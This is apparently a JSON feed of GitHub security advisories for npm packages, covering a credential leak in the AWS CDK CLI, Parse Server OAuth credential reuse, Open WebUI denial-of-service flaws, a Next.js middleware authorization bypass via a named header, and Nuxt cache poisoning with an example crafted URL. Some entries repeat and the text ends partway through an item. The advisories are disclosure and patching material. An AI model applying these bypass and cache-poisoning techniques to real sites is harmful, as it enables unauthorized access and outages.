{
    "version": "https://jsonfeed.org/version/1",
    "title": "Security Advisory for JavaScript packages hosted at npmjs.com",
    "home_page_url": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm",
    "feed_url": "https://azu.github.io/github-advisory-database-rss/npm.json",
    "description": "Security Advisory for JavaScript packages hosted at npmjs.com on GitHub",
    "items": [
        {
            "content_html": "<h2 id=\"summary\">Summary</h2>\n<p>The AWS Cloud Development Kit (AWS CDK) [1] is an open-source software development framework for defining cloud infrastructure in code and provisioning it through AWS CloudFormation. The AWS CDK CLI [2] is a command line tool for interacting with CDK applications. Customers can use the CDK CLI to create, manage, and deploy their AWS CDK projects. </p>\n<p>An issue exists in the AWS CDK CLI where, under certain conditions, AWS credentials may be returned in the console output. Plugins that return an <code>expiration </code>property in the credentials object are affected by this issue. Plugins that omit the <code>expiration</code> property are not affected. </p>\n<h2 id=\"impact\">Impact</h2>\n<p>When customers run AWS CDK CLI commands with credential plugins and configure those plugins to return temporary credentials by including an <code>expiration</code> property, the AWS credentials retrieved by the plugin may be returned in the console output. Any user with access where the CDK CLI was ran would have access to this output. </p>\n<p>The following are examples of configuring a custom credential plugin: </p>\n<p><em>Via command line option:</em></p>\n<p><code>cdk deploy --plugin /path/to/plugin</code></p>\n<p><em>Via configuration file [3]:</em></p>\n<pre><code class=\"language-json\">{\n  \"plugin\": \"/path/to/plugin\"\n}\n</code></pre>\n<p>Plugins that return an <code>expiration</code> property in the credentials object, such as the following example, are affected:</p>\n<pre><code class=\"language-console\">return {\n    accessKeyId: '&lt;access-key&gt;',\n    secretAccessKey: '&lt;secret-access-key&gt;',\n    sessionToken: '&lt;session-token&gt;',\n    expiration: &lt;date&gt;,\n};\n</code></pre>\n<p>The <code>expiration</code> property indicates that the provided credentials are temporary. </p>\n<p>Please refer to our \"AWS CDK CLI Library\" guide for more information about custom credential plugins [4].</p>\n<h2 id=\"impacted-versions--21720-and-21782\">Impacted versions:  &gt;=2.172.0 and &lt;2.178.2</h2>\n<h2 id=\"patches\">Patches</h2>\n<p>The issue has been addressed in version 2.178.2 [5]. We recommend upgrading to the latest version and ensuring any forked or derivative code is patched to incorporate the new fixes. </p>\n<h2 id=\"workarounds\">Workarounds</h2>\n<p>If you are unable to upgrade to version 2.178.2 or later, you can downgrade to version 2.171.1. If you are unable to downgrade, but have access to the code of the credential plugin you use, you can remove the <code>expiration</code> property from the object returned by the plugin.</p>\n<p>For example, change the code from returning this:</p>\n<pre><code class=\"language-javascript\">return {\n    accessKeyId: assumeRoleOutput.Credentials.AccessKeyId,\n    secretAccessKey: assumeRoleOutput.Credentials.SecretAccessKey,\n    sessionToken: assumeRoleOutput.Credentials.SessionToken,\n\n    // Expiration indicates to the CLI that this is temporary\n    expiration: assumeRoleOutput.Credentials.Expiration,\n};\n</code></pre>\n<p>To return this:</p>\n<pre><code class=\"language-javascript\">return {\n    accessKeyId: assumeRoleOutput.Credentials.AccessKeyId,\n    secretAccessKey: assumeRoleOutput.Credentials.SecretAccessKey,\n    sessionToken: assumeRoleOutput.Credentials.SessionToken,\n};\n</code></pre>\n<p>Note that this will prevent the CDK CLI from refreshing the credentials when needed, and may cause your workflow to fail on an expired credentials error. </p>\n<h2 id=\"references\">References</h2>\n<p>[1] <a href=\"https://docs.aws.amazon.com/cdk/v2/guide/home.html\">https://docs.aws.amazon.com/cdk/v2/guide/home.html</a></p>\n<p>[2] <a href=\"https://docs.aws.amazon.com/cdk/v2/guide/cli.html\">https://docs.aws.amazon.com/cdk/v2/guide/cli.html</a></p>\n<p>[3] <a href=\"https://docs.aws.amazon.com/cdk/v2/guide/cli.html#cli-config\">https://docs.aws.amazon.com/cdk/v2/guide/cli.html#cli-config</a></p>\n<p>[4] <a href=\"https://www.npmjs.com/package/@aws-cdk/cli-plugin-contract\">https://www.npmjs.com/package/@aws-cdk/cli-plugin-contract</a></p>\n<p>[5] <a href=\"https://github.com/aws/aws-cdk/releases/tag/v2.178.2\">https://github.com/aws/aws-cdk/releases/tag/v2.178.2</a></p>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/aws/aws-cdk/security/advisories/GHSA-v63m-x9r9-8gqp\">https://github.com/aws/aws-cdk/security/advisories/GHSA-v63m-x9r9-8gqp</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-2598\">https://nvd.nist.gov/vuln/detail/CVE-2025-2598</a></li>\n<li><a href=\"https://aws.amazon.com/security/security-bulletins/AWS-2025-005\">https://aws.amazon.com/security/security-bulletins/AWS-2025-005</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-v63m-x9r9-8gqp\">https://github.com/advisories/GHSA-v63m-x9r9-8gqp</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-v63m-x9r9-8gqp",
            "title": "[cdk] AWS CDK CLI prints AWS credentials retrieved by custom credential plugins",
            "date_modified": "2025-03-21T17:43:10.000Z",
            "date_published": "2025-03-21T17:43:09.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-v63m-x9r9-8gqp"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h2 id=\"summary\">Summary</h2>\n<p>The AWS Cloud Development Kit (AWS CDK) [1] is an open-source software development framework for defining cloud infrastructure in code and provisioning it through AWS CloudFormation. The AWS CDK CLI [2] is a command line tool for interacting with CDK applications. Customers can use the CDK CLI to create, manage, and deploy their AWS CDK projects. </p>\n<p>An issue exists in the AWS CDK CLI where, under certain conditions, AWS credentials may be returned in the console output. Plugins that return an <code>expiration </code>property in the credentials object are affected by this issue. Plugins that omit the <code>expiration</code> property are not affected. </p>\n<h2 id=\"impact\">Impact</h2>\n<p>When customers run AWS CDK CLI commands with credential plugins and configure those plugins to return temporary credentials by including an <code>expiration</code> property, the AWS credentials retrieved by the plugin may be returned in the console output. Any user with access where the CDK CLI was ran would have access to this output. </p>\n<p>The following are examples of configuring a custom credential plugin: </p>\n<p><em>Via command line option:</em></p>\n<p><code>cdk deploy --plugin /path/to/plugin</code></p>\n<p><em>Via configuration file [3]:</em></p>\n<pre><code class=\"language-json\">{\n  \"plugin\": \"/path/to/plugin\"\n}\n</code></pre>\n<p>Plugins that return an <code>expiration</code> property in the credentials object, such as the following example, are affected:</p>\n<pre><code class=\"language-console\">return {\n    accessKeyId: '&lt;access-key&gt;',\n    secretAccessKey: '&lt;secret-access-key&gt;',\n    sessionToken: '&lt;session-token&gt;',\n    expiration: &lt;date&gt;,\n};\n</code></pre>\n<p>The <code>expiration</code> property indicates that the provided credentials are temporary. </p>\n<p>Please refer to our \"AWS CDK CLI Library\" guide for more information about custom credential plugins [4].</p>\n<h2 id=\"impacted-versions--21720-and-21782\">Impacted versions:  &gt;=2.172.0 and &lt;2.178.2</h2>\n<h2 id=\"patches\">Patches</h2>\n<p>The issue has been addressed in version 2.178.2 [5]. We recommend upgrading to the latest version and ensuring any forked or derivative code is patched to incorporate the new fixes. </p>\n<h2 id=\"workarounds\">Workarounds</h2>\n<p>If you are unable to upgrade to version 2.178.2 or later, you can downgrade to version 2.171.1. If you are unable to downgrade, but have access to the code of the credential plugin you use, you can remove the <code>expiration</code> property from the object returned by the plugin.</p>\n<p>For example, change the code from returning this:</p>\n<pre><code class=\"language-javascript\">return {\n    accessKeyId: assumeRoleOutput.Credentials.AccessKeyId,\n    secretAccessKey: assumeRoleOutput.Credentials.SecretAccessKey,\n    sessionToken: assumeRoleOutput.Credentials.SessionToken,\n\n    // Expiration indicates to the CLI that this is temporary\n    expiration: assumeRoleOutput.Credentials.Expiration,\n};\n</code></pre>\n<p>To return this:</p>\n<pre><code class=\"language-javascript\">return {\n    accessKeyId: assumeRoleOutput.Credentials.AccessKeyId,\n    secretAccessKey: assumeRoleOutput.Credentials.SecretAccessKey,\n    sessionToken: assumeRoleOutput.Credentials.SessionToken,\n};\n</code></pre>\n<p>Note that this will prevent the CDK CLI from refreshing the credentials when needed, and may cause your workflow to fail on an expired credentials error. </p>\n<h2 id=\"references\">References</h2>\n<p>[1] <a href=\"https://docs.aws.amazon.com/cdk/v2/guide/home.html\">https://docs.aws.amazon.com/cdk/v2/guide/home.html</a></p>\n<p>[2] <a href=\"https://docs.aws.amazon.com/cdk/v2/guide/cli.html\">https://docs.aws.amazon.com/cdk/v2/guide/cli.html</a></p>\n<p>[3] <a href=\"https://docs.aws.amazon.com/cdk/v2/guide/cli.html#cli-config\">https://docs.aws.amazon.com/cdk/v2/guide/cli.html#cli-config</a></p>\n<p>[4] <a href=\"https://www.npmjs.com/package/@aws-cdk/cli-plugin-contract\">https://www.npmjs.com/package/@aws-cdk/cli-plugin-contract</a></p>\n<p>[5] <a href=\"https://github.com/aws/aws-cdk/releases/tag/v2.178.2\">https://github.com/aws/aws-cdk/releases/tag/v2.178.2</a></p>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/aws/aws-cdk/security/advisories/GHSA-v63m-x9r9-8gqp\">https://github.com/aws/aws-cdk/security/advisories/GHSA-v63m-x9r9-8gqp</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-2598\">https://nvd.nist.gov/vuln/detail/CVE-2025-2598</a></li>\n<li><a href=\"https://aws.amazon.com/security/security-bulletins/AWS-2025-005\">https://aws.amazon.com/security/security-bulletins/AWS-2025-005</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-v63m-x9r9-8gqp\">https://github.com/advisories/GHSA-v63m-x9r9-8gqp</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-v63m-x9r9-8gqp",
            "title": "[aws-cdk] AWS CDK CLI prints AWS credentials retrieved by custom credential plugins",
            "date_modified": "2025-03-21T17:43:10.000Z",
            "date_published": "2025-03-21T17:43:09.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-v63m-x9r9-8gqp"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>The 3rd party authentication handling of Parse Server allows the authentication credentials of some specific authentication providers to be used across multiple Parse Server apps. For example, if a user signed up using the same authentication provider in two unrelated Parse Server apps, the credentials stored by one app can be used to authenticate the same user in the other app. Note that this only affects Parse Server apps that specifically use an affected 3rd party authentication provider for user authentication, for example by setting the Parse Server option <code>auth</code> to configure a Parse Server authentication adapter. See the <a href=\"https://docs.parseplatform.org/parse-server/guide/#oauth-and-3rd-party-authentication\">3rd party authentication docs</a> for more information on which authentication providers are affected.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>The fix of this vulnerability requires to upgrade Parse Server to a version that includes the bug fix, as well as upgrade the client app to send a secure payload, which is different from the previous insecure payload. To accommodate a gradual rollout of the client app update, affected Parse Server authentication adapters now offer an <code>enableInsecureAuth</code> option to accept both insecure and secure payloads from clients apps. See the <a href=\"https://docs.parseplatform.org/parse-server/guide/#oauth-and-3rd-party-authentication\">3rd party authentication docs</a> for how to migrate from insecure to secure authentication.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>None.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li>GitHub security advisory: <a href=\"https://github.com/parse-community/parse-server/security/advisories/GHSA-837q-jhwx-cmpv\">https://github.com/parse-community/parse-server/security/advisories/GHSA-837q-jhwx-cmpv</a></li>\n<li>Parse Server documentation for 3rd party authentication providers: <a href=\"https://docs.parseplatform.org/parse-server/guide/#oauth-and-3rd-party-authentication\">https://docs.parseplatform.org/parse-server/guide/#oauth-and-3rd-party-authentication</a></li>\n<li>Bug fix in Parse Server 7: <a href=\"https://github.com/parse-community/parse-server/pull/9668\">https://github.com/parse-community/parse-server/pull/9668</a></li>\n<li>Bug fix in Parse Server 8: <a href=\"https://github.com/parse-community/parse-server/pull/9667\">https://github.com/parse-community/parse-server/pull/9667</a></li>\n</ul>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/parse-community/parse-server/security/advisories/GHSA-837q-jhwx-cmpv\">https://github.com/parse-community/parse-server/security/advisories/GHSA-837q-jhwx-cmpv</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-30168\">https://nvd.nist.gov/vuln/detail/CVE-2025-30168</a></li>\n<li><a href=\"https://github.com/parse-community/parse-server/pull/9667\">https://github.com/parse-community/parse-server/pull/9667</a></li>\n<li><a href=\"https://github.com/parse-community/parse-server/pull/9668\">https://github.com/parse-community/parse-server/pull/9668</a></li>\n<li><a href=\"https://github.com/parse-community/parse-server/commit/2ff9c71030bce3aada0a00fbceedeb7ae2c8a41e\">https://github.com/parse-community/parse-server/commit/2ff9c71030bce3aada0a00fbceedeb7ae2c8a41e</a></li>\n<li><a href=\"https://github.com/parse-community/parse-server/commit/5ef0440c8e763854e62341acaeb6dc4ade3ba82f\">https://github.com/parse-community/parse-server/commit/5ef0440c8e763854e62341acaeb6dc4ade3ba82f</a></li>\n<li><a href=\"https://docs.parseplatform.org/parse-server/guide/#oauth-and-3rd-party-authentication\">https://docs.parseplatform.org/parse-server/guide/#oauth-and-3rd-party-authentication</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-837q-jhwx-cmpv\">https://github.com/advisories/GHSA-837q-jhwx-cmpv</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-837q-jhwx-cmpv",
            "title": "[parse-server] Parse Server has an OAuth login vulnerability",
            "date_modified": "2025-03-21T17:42:50.000Z",
            "date_published": "2025-03-21T17:42:47.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-837q-jhwx-cmpv"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>The 3rd party authentication handling of Parse Server allows the authentication credentials of some specific authentication providers to be used across multiple Parse Server apps. For example, if a user signed up using the same authentication provider in two unrelated Parse Server apps, the credentials stored by one app can be used to authenticate the same user in the other app. Note that this only affects Parse Server apps that specifically use an affected 3rd party authentication provider for user authentication, for example by setting the Parse Server option <code>auth</code> to configure a Parse Server authentication adapter. See the <a href=\"https://docs.parseplatform.org/parse-server/guide/#oauth-and-3rd-party-authentication\">3rd party authentication docs</a> for more information on which authentication providers are affected.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>The fix of this vulnerability requires to upgrade Parse Server to a version that includes the bug fix, as well as upgrade the client app to send a secure payload, which is different from the previous insecure payload. To accommodate a gradual rollout of the client app update, affected Parse Server authentication adapters now offer an <code>enableInsecureAuth</code> option to accept both insecure and secure payloads from clients apps. See the <a href=\"https://docs.parseplatform.org/parse-server/guide/#oauth-and-3rd-party-authentication\">3rd party authentication docs</a> for how to migrate from insecure to secure authentication.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>None.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li>GitHub security advisory: <a href=\"https://github.com/parse-community/parse-server/security/advisories/GHSA-837q-jhwx-cmpv\">https://github.com/parse-community/parse-server/security/advisories/GHSA-837q-jhwx-cmpv</a></li>\n<li>Parse Server documentation for 3rd party authentication providers: <a href=\"https://docs.parseplatform.org/parse-server/guide/#oauth-and-3rd-party-authentication\">https://docs.parseplatform.org/parse-server/guide/#oauth-and-3rd-party-authentication</a></li>\n<li>Bug fix in Parse Server 7: <a href=\"https://github.com/parse-community/parse-server/pull/9668\">https://github.com/parse-community/parse-server/pull/9668</a></li>\n<li>Bug fix in Parse Server 8: <a href=\"https://github.com/parse-community/parse-server/pull/9667\">https://github.com/parse-community/parse-server/pull/9667</a></li>\n</ul>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/parse-community/parse-server/security/advisories/GHSA-837q-jhwx-cmpv\">https://github.com/parse-community/parse-server/security/advisories/GHSA-837q-jhwx-cmpv</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-30168\">https://nvd.nist.gov/vuln/detail/CVE-2025-30168</a></li>\n<li><a href=\"https://github.com/parse-community/parse-server/pull/9667\">https://github.com/parse-community/parse-server/pull/9667</a></li>\n<li><a href=\"https://github.com/parse-community/parse-server/pull/9668\">https://github.com/parse-community/parse-server/pull/9668</a></li>\n<li><a href=\"https://github.com/parse-community/parse-server/commit/2ff9c71030bce3aada0a00fbceedeb7ae2c8a41e\">https://github.com/parse-community/parse-server/commit/2ff9c71030bce3aada0a00fbceedeb7ae2c8a41e</a></li>\n<li><a href=\"https://github.com/parse-community/parse-server/commit/5ef0440c8e763854e62341acaeb6dc4ade3ba82f\">https://github.com/parse-community/parse-server/commit/5ef0440c8e763854e62341acaeb6dc4ade3ba82f</a></li>\n<li><a href=\"https://docs.parseplatform.org/parse-server/guide/#oauth-and-3rd-party-authentication\">https://docs.parseplatform.org/parse-server/guide/#oauth-and-3rd-party-authentication</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-837q-jhwx-cmpv\">https://github.com/advisories/GHSA-837q-jhwx-cmpv</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-837q-jhwx-cmpv",
            "title": "[parse-server] Parse Server has an OAuth login vulnerability",
            "date_modified": "2025-03-21T17:42:50.000Z",
            "date_published": "2025-03-21T17:42:47.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-837q-jhwx-cmpv"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>In version v0.3.32 of open-webui/open-webui, the application allows users to submit large payloads in the email and password fields during the sign-in process due to the lack of character length validation on these inputs. This vulnerability can lead to a Denial of Service (DoS) condition when a user submits excessively large strings, exhausting server resources such as CPU, memory, and disk space, and rendering the service unavailable for legitimate users. This makes the server susceptible to resource exhaustion attacks without requiring authentication.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-12534\">https://nvd.nist.gov/vuln/detail/CVE-2024-12534</a></li>\n<li><a href=\"https://huntr.com/bounties/c7c0a4e6-acd3-49b4-8684-2c2c27014b76\">https://huntr.com/bounties/c7c0a4e6-acd3-49b4-8684-2c2c27014b76</a></li>\n<li><a href=\"https://github.com/open-webui/open-webui/blob/e8babe62bc8e466be0367703fd062a981f5c2394/src/lib/apis/auths/index.ts#L113-L142\">https://github.com/open-webui/open-webui/blob/e8babe62bc8e466be0367703fd062a981f5c2394/src/lib/apis/auths/index.ts#L113-L142</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-g3mx-83mp-3rwc\">https://github.com/advisories/GHSA-g3mx-83mp-3rwc</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-g3mx-83mp-3rwc",
            "title": "[open-webui] Open WebUI Uncontrolled Resource Consumption vulnerability",
            "date_modified": "2025-03-21T17:30:10.000Z",
            "date_published": "2025-03-20T12:32:43.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-g3mx-83mp-3rwc"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>In version 0.3.32 of open-webui/open-webui, the absence of authentication mechanisms allows any unauthenticated attacker to access the <code>api/v1/utils/code/format</code> endpoint. If a malicious actor sends a POST request with an excessively high volume of content, the server could become completely unresponsive. This could lead to severe performance issues, causing the server to become unresponsive or experience significant degradation, ultimately resulting in service interruptions for legitimate users.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-12537\">https://nvd.nist.gov/vuln/detail/CVE-2024-12537</a></li>\n<li><a href=\"https://huntr.com/bounties/edabd06c-acc0-428c-a481-271f333755bc\">https://huntr.com/bounties/edabd06c-acc0-428c-a481-271f333755bc</a></li>\n<li><a href=\"https://github.com/open-webui/open-webui/blob/e8babe62bc8e466be0367703fd062a981f5c2394/src/lib/apis/utils/index.ts#L25-L56\">https://github.com/open-webui/open-webui/blob/e8babe62bc8e466be0367703fd062a981f5c2394/src/lib/apis/utils/index.ts#L25-L56</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-chf7-q7m5-fq92\">https://github.com/advisories/GHSA-chf7-q7m5-fq92</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-chf7-q7m5-fq92",
            "title": "[open-webui] Open WebUI Uncontrolled Resource Consumption vulnerability",
            "date_modified": "2025-03-21T17:29:28.000Z",
            "date_published": "2025-03-20T12:32:43.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-chf7-q7m5-fq92"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h1 id=\"impact\">Impact</h1>\n<p>It is possible to bypass authorization checks within a Next.js application, if the authorization check occurs in middleware.</p>\n<h1 id=\"patches\">Patches</h1>\n<ul>\n<li>For Next.js 15.x, this issue is fixed in <code>15.2.3</code></li>\n<li>For Next.js 14.x, this issue is fixed in <code>14.2.25</code></li>\n<li>For Next.js versions <code>11.1.4</code> thru <code>13.5.6</code>, consult the below workaround.</li>\n</ul>\n<h1 id=\"workaround\">Workaround</h1>\n<p>If patching to a safe version is infeasible, it is recommend that you prevent external user requests which contain the <code>x-middleware-subrequest</code> header from reaching your Next.js application.</p>\n<h2 id=\"credits\">Credits</h2>\n<ul>\n<li>Allam Rachid (zhero;)</li>\n<li>Allam Yasser (inzo_)</li>\n</ul>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/vercel/next.js/security/advisories/GHSA-f82v-jwr5-mffw\">https://github.com/vercel/next.js/security/advisories/GHSA-f82v-jwr5-mffw</a></li>\n<li><a href=\"https://github.com/vercel/next.js/commit/52a078da3884efe6501613c7834a3d02a91676d2\">https://github.com/vercel/next.js/commit/52a078da3884efe6501613c7834a3d02a91676d2</a></li>\n<li><a href=\"https://github.com/vercel/next.js/commit/5fd3ae8f8542677c6294f32d18022731eab6fe48\">https://github.com/vercel/next.js/commit/5fd3ae8f8542677c6294f32d18022731eab6fe48</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-29927\">https://nvd.nist.gov/vuln/detail/CVE-2025-29927</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-f82v-jwr5-mffw\">https://github.com/advisories/GHSA-f82v-jwr5-mffw</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-f82v-jwr5-mffw",
            "title": "[next] Authorization Bypass in Next.js Middleware",
            "date_modified": "2025-03-21T15:42:38.000Z",
            "date_published": "2025-03-21T15:20:12.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-f82v-jwr5-mffw"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h1 id=\"impact\">Impact</h1>\n<p>It is possible to bypass authorization checks within a Next.js application, if the authorization check occurs in middleware.</p>\n<h1 id=\"patches\">Patches</h1>\n<ul>\n<li>For Next.js 15.x, this issue is fixed in <code>15.2.3</code></li>\n<li>For Next.js 14.x, this issue is fixed in <code>14.2.25</code></li>\n<li>For Next.js versions <code>11.1.4</code> thru <code>13.5.6</code>, consult the below workaround.</li>\n</ul>\n<h1 id=\"workaround\">Workaround</h1>\n<p>If patching to a safe version is infeasible, it is recommend that you prevent external user requests which contain the <code>x-middleware-subrequest</code> header from reaching your Next.js application.</p>\n<h2 id=\"credits\">Credits</h2>\n<ul>\n<li>Allam Rachid (zhero;)</li>\n<li>Allam Yasser (inzo_)</li>\n</ul>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/vercel/next.js/security/advisories/GHSA-f82v-jwr5-mffw\">https://github.com/vercel/next.js/security/advisories/GHSA-f82v-jwr5-mffw</a></li>\n<li><a href=\"https://github.com/vercel/next.js/commit/52a078da3884efe6501613c7834a3d02a91676d2\">https://github.com/vercel/next.js/commit/52a078da3884efe6501613c7834a3d02a91676d2</a></li>\n<li><a href=\"https://github.com/vercel/next.js/commit/5fd3ae8f8542677c6294f32d18022731eab6fe48\">https://github.com/vercel/next.js/commit/5fd3ae8f8542677c6294f32d18022731eab6fe48</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-29927\">https://nvd.nist.gov/vuln/detail/CVE-2025-29927</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-f82v-jwr5-mffw\">https://github.com/advisories/GHSA-f82v-jwr5-mffw</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-f82v-jwr5-mffw",
            "title": "[next] Authorization Bypass in Next.js Middleware",
            "date_modified": "2025-03-21T15:42:38.000Z",
            "date_published": "2025-03-21T15:20:12.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-f82v-jwr5-mffw"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h1 id=\"impact\">Impact</h1>\n<p>It is possible to bypass authorization checks within a Next.js application, if the authorization check occurs in middleware.</p>\n<h1 id=\"patches\">Patches</h1>\n<ul>\n<li>For Next.js 15.x, this issue is fixed in <code>15.2.3</code></li>\n<li>For Next.js 14.x, this issue is fixed in <code>14.2.25</code></li>\n<li>For Next.js versions <code>11.1.4</code> thru <code>13.5.6</code>, consult the below workaround.</li>\n</ul>\n<h1 id=\"workaround\">Workaround</h1>\n<p>If patching to a safe version is infeasible, it is recommend that you prevent external user requests which contain the <code>x-middleware-subrequest</code> header from reaching your Next.js application.</p>\n<h2 id=\"credits\">Credits</h2>\n<ul>\n<li>Allam Rachid (zhero;)</li>\n<li>Allam Yasser (inzo_)</li>\n</ul>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/vercel/next.js/security/advisories/GHSA-f82v-jwr5-mffw\">https://github.com/vercel/next.js/security/advisories/GHSA-f82v-jwr5-mffw</a></li>\n<li><a href=\"https://github.com/vercel/next.js/commit/52a078da3884efe6501613c7834a3d02a91676d2\">https://github.com/vercel/next.js/commit/52a078da3884efe6501613c7834a3d02a91676d2</a></li>\n<li><a href=\"https://github.com/vercel/next.js/commit/5fd3ae8f8542677c6294f32d18022731eab6fe48\">https://github.com/vercel/next.js/commit/5fd3ae8f8542677c6294f32d18022731eab6fe48</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-29927\">https://nvd.nist.gov/vuln/detail/CVE-2025-29927</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-f82v-jwr5-mffw\">https://github.com/advisories/GHSA-f82v-jwr5-mffw</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-f82v-jwr5-mffw",
            "title": "[next] Authorization Bypass in Next.js Middleware",
            "date_modified": "2025-03-21T15:42:38.000Z",
            "date_published": "2025-03-21T15:20:12.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-f82v-jwr5-mffw"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>A Denial of Service (DoS) vulnerability exists in open-webui/open-webui version 0.3.21. This vulnerability affects multiple endpoints, including <code>/ollama/models/upload</code>, <code>/audio/api/v1/transcriptions</code>, and <code>/rag/api/v1/doc</code>. The application processes multipart boundaries without authentication, leading to resource exhaustion. By appending additional characters to the multipart boundary, an attacker can cause the server to parse each byte of the boundary, ultimately leading to service unavailability. This vulnerability can be exploited remotely, resulting in high CPU and memory usage, and rendering the service inaccessible to legitimate users.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-9840\">https://nvd.nist.gov/vuln/detail/CVE-2024-9840</a></li>\n<li><a href=\"https://huntr.com/bounties/9178f09e-4d4f-4a5b-bc32-cada7445b03c\">https://huntr.com/bounties/9178f09e-4d4f-4a5b-bc32-cada7445b03c</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-5ccf-884p-4jjq\">https://github.com/advisories/GHSA-5ccf-884p-4jjq</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-5ccf-884p-4jjq",
            "title": "[open-webui] Open WebUI Unauthenticated Multipart Boundary Denial of Service (DoS) Vulnerability",
            "date_modified": "2025-03-21T03:38:58.000Z",
            "date_published": "2025-03-20T12:32:51.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-5ccf-884p-4jjq"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>By sending a crafted HTTP request to a server behind an CDN, it is possible in some circumstances to poison the CDN cache and highly impacts the availability of a site.</p>\n<p>It is possible to craft a request, such as <code>https://mysite.com/?/_payload.json</code> which will be rendered as JSON. If the CDN in front of a Nuxt site ignores the query string when determining whether to cache a route, then this JSON response could be served to future visitors to the site.</p>\n<h3 id=\"impact\">Impact</h3>\n<p>An attacker can perform this attack to a vulnerable site in order to make a site unavailable indefinitely. It is also possible in the case where the cache will be reset to make a small script to send a request each X seconds (=caching duration) so that the cache is permanently poisoned making the site completely unavailable.</p>\n<h2 id=\"conclusion-\">Conclusion :</h2>\n<p>This is similar to a vulnerability in Next.js that resulted in CVE-2024-46982 (and see <a href=\"https://zhero-web-sec.github.io/research-and-things/nextjs-cache-and-chains-the-stale-elixir\">this article</a>, in particular the \"Internal URL parameter and pageProps\" part, the latter being very similar to the one concerning us here.)</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/nuxt/nuxt/security/advisories/GHSA-jvhm-gjrh-3h93\">https://github.com/nuxt/nuxt/security/advisories/GHSA-jvhm-gjrh-3h93</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-27415\">https://nvd.nist.gov/vuln/detail/CVE-2025-27415</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-jvhm-gjrh-3h93\">https://github.com/advisories/GHSA-jvhm-gjrh-3h93</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-jvhm-gjrh-3h93",
